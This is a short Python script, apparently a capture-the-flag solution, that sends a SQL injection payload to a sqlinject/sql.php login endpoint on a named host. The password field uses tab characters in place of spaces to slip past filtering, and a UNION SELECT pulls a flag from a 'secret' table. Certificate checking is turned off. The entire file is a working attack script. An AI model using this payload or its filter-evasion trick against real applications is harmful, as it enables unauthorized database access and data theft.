import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

myparams = {'password': "'\x09or\x09id\x09like\x09'admin'\x09UNION\x09select\x09flag,flag\x09FROM\x09flag_is_here.secret\x09WHERE\x091\x09like\x091\x09limit\x091,1--\x09"}
r = requests.post('https://me.zongyuan.nctu.me/sqlinject/sql.php', data=myparams, verify=False)
if r.status_code == requests.codes.ok:
	print(r.text.split('h2')[1])
